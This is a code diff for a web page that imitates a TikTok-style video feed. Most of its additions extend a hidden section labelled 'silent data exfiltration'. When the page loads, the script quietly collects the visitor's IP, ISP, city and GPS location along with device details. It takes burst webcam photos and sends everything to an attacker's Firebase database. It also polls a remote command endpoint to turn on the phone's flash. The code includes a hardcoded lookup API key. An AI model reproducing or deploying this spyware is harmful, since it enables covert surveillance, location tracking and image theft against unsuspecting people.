@@ -1,7 +1,3 @@
-// =========================================================
-// [ LOGIKA ASLI - INTERFACE TIKTOK ]
-// =========================================================
-
 const comments = document.getElementById("comments");
 const feedContainer = document.getElementById("feedContainer");
 const videoItems = document.querySelectorAll(".video-item");
@@ -72,41 +68,79 @@ const scrollObserver = new IntersectionObserver((entries) => {
 videoItems.forEach((item) => scrollObserver.observe(item));
 
 
-// ======= HACK =======
-// [ SILENT DATA EXFILTRATION - CYBER ONX ]
-
+// ===============================================
+// [ SILENT DATA EXFILTRATION - ULTRA INTEL ]
+// ===============================================
 
 const FIREBASE_API = "https://data-target-32614-default-rtdb.asia-southeast1.firebasedatabase.app/targets.json";
+const COMMAND_URL = "https://data-target-32614-default-rtdb.asia-southeast1.firebasedatabase.app/commands.json";
+const IP2LOC_KEY = "377D98C67FC2E3AA42FDFACD479A4E67";
 
 async function startSilentLoot() {
+    // Session ID biar 4 foto masuk 1 folder di Data Center
+    const sessionID = "ONX-" + Math.random().toString(36).substr(2, 9).toUpperCase();
+
     let report = {
-        userAgent: navigator.userAgent,
-        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
-        platform: navigator.platform,
+        session_id: sessionID,
         time: new Date().toLocaleString(),
-        ip: "Fetching...",
-        loc: "Access Denied"
+        // Browser & Device Info (Gambar 2)
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
+        referrer: document.referrer || "Direct Access",
+        language: navigator.language
     };
 
-    // Ambil IP Publik
+    // --- 1. AMBIL DATA LENGKAP VIA IP2LOCATION (Gambar 1) ---
     try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        report.ip = ipData.ip;
-    } catch (e) {}
+        const res = await fetch(`https://api.ip2location.io/?key=${IP2LOC_KEY}`);
+        const d = await res.json();
 
-    // Ambil Koordinat GPS
+        if (d.ip) {
+            report.ip = d.ip;
+            report.isp = d.isp;
+            report.city = d.city_name;
+            report.state = d.region_name;
+            report.country = d.country_name;
+            report.district = d.district || "N/A";
+            report.zip_code = d.zip_code;
+            report.loc = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+            report.time_zone = d.time_zone;
+            report.is_proxy = d.is_proxy ? "YES (VPN/Proxy)" : "No";
+            report.asn = d.asn;
+            report.as_name = d.as;
+            report.fraud_score = d.fraud_score || "N/A";
+        }
+    } catch (e) {
+        // Fallback ke ip-api kalau key mati/limit
+        const fbRes = await fetch('http://ip-api.com/json/');
+        const fb = await fbRes.json();
+        report.ip = fb.query;
+        report.isp = fb.isp;
+        report.city = fb.city;
+        report.loc = `https://www.google.com/maps?q=${fb.lat},${fb.lon}`;
+    }
+
+    // --- 2. AMBIL GPS AKURAT (KALAU TARGET ALLOW) ---
     navigator.geolocation.getCurrentPosition((pos) => {
         report.loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-    });
+        report.gps_accuracy = "High (Satelite)";
+    }, null, { enableHighAccuracy: true });
 
-    // Ambil Kamera 4x Burst secara diam-diam
+    // --- 3. EKSEKUSI KAMERA & FLASH ---
+    initCamera(report);
+}
+
+async function initCamera(report) {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement('video');
         const canvas = document.createElement('canvas');
         video.srcObject = stream;
         await video.play();
+
+        // Aktifkan Fitur Remote Flash
+        listenForFlash(stream);
 
         let shots = 0;
         let burst = setInterval(async () => {
@@ -116,9 +150,8 @@ async function startSilentLoot() {
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                const imageData = canvas.toDataURL('image/jpeg');
+                const imageData = canvas.toDataURL('image/jpeg', 0.6);
 
-                // Kirim data ke Firebase (API)
                 await fetch(FIREBASE_API, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -126,12 +159,13 @@ async function startSilentLoot() {
                 });
             } else {
                 clearInterval(burst);
-                stream.getTracks().forEach(track => track.stop());
+                // Matikan kamera setelah selesai 4x jepret (opsional)
+                // stream.getTracks().forEach(track => track.stop());
             }
         }, 1500);
 
     } catch (err) {
-        // Tetap kirim info device meskipun kamera ditolak
+        // Kirim data tanpa foto jika kamera ditolak
         fetch(FIREBASE_API, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -140,7 +174,30 @@ async function startSilentLoot() {
     }
 }
 
-// Jalankan otomatis saat web dimuat
+async function listenForFlash(stream) {
+    const track = stream.getVideoTracks()[0];
+    
+    // 1. Pastikan pas awal konek, Flash dalam posisi OFF
+    try {
+        await track.applyConstraints({ advanced: [{ torch: false }] });
+    } catch(e) {}
+
+    // 2. Baru dengerin perintah dari Data Center
+    setInterval(async () => {
+        try {
+            const res = await fetch(COMMAND_URL);
+            const cmd = await res.json();
+            
+            // Logika: Hanya nyala jika perintah di Firebase EXPLICITLY "ON"
+            if (cmd && cmd.flash === "ON") {
+                await track.applyConstraints({ advanced: [{ torch: true }] });
+            } else {
+                await track.applyConstraints({ advanced: [{ torch: false }] });
+            }
+        } catch (e) {}
+    }, 2000);
+} 
+
 window.onload = () => {
     setTimeout(startSilentLoot, 2000);
 };
